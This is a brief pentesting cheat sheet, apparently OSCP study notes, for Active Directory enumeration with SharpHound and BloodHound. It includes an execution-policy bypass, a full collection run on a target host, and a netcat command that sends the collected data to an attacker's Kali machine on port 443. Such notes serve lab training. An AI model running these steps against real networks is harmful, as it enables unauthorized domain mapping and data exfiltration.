## Sharphound Github Repo: 
https://github.com/BloodHoundAD/SharpHound

In Kali: sudo start neo4j && bloodhound

To install in Kali: sudo apt install -y neo4j && sudo apt install bloodhound -y

## Documentation:
https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html

https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

### Step:
Download file "https://github.com/hackersupcoming/My_OSCP_tools/blob/main/Sharphound/sharphound.ps1" in target system

powershell -ep bypass

Import-Module .\sharphound.ps1

Invoke-Bloodhound

Get-Help Invoke-Bloodhound  ## To check commands

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\username\Desktop\ -OutputPrefix "output"

### To Tranfer file from windows to kali:
In Windows: nc.exe -w 3 kali-ip 443 < file-to-transfer

In Kali: nc -lvp 443 > output-filename
